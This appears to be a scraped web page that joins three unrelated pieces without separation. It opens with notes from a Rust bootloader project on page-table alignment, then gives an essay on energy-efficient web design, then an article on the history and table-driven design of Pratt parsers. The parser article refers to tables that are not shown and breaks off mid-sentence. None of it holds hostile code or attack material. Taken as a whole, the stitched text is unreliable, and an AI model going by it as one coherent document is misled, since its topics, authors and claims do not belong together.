<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol>

<h2>Issues</h2>

<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>

    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It’s probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn’t really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don’t care. They’re probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they’re wasting expensive data on mobile connections in other countries? “But Carl, some of us don’t have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.” Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it’s easy to assume that it’s a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: “Does it look well-designed?” Well, look under the hood. It’s pretty terrifying. And that’s not even getting into the many accessibility concerns. If only more designers would ask themselves, “When was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?” </p>
<p>These are questions I have put to designers before, and the response quite often is, “I’m just experimenting with technologies and trying to improve my UI skills. What harm is there in that?” Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody—besides an echo chamber of fellow designers—give a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That’s not to say aesthetics aren’t important—they certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it’s annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I’ll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you’re not aware of the underlying code, then you’ll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user’s device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don’t let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don’t meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>

                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now “Yacc”), “Yet Another Compiler Compiler.”<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra’s sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt’s parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt’s mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman’s “Deterministic parsing of ambiguous grammars,“<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.’s “Types are not sets,”<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own “parselet” method, traditionally named <code>led</code>  for “left donation” after Pratt’s original article, that is called by a driver algorithm and is responsible for parsing the node instance’s operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (“left donation” parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator—even if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing “<code>parser.registeroperator(op, prec, assoc, whatever)</code>,” the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>❝The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.❞</p>

<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you’d like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<h3 id="more-sophisticated-operators">More Sophisticated Operators</h3>

<p>Suppose we have ternary, mixfix, or matchfix operators. Then we need to modify the operator database to reflect how the operator tokens appear in an expression. A portion of our operator table might now look like this.</p>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup—not at compile time—the Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the …</p></div></section></article></div></div></div>
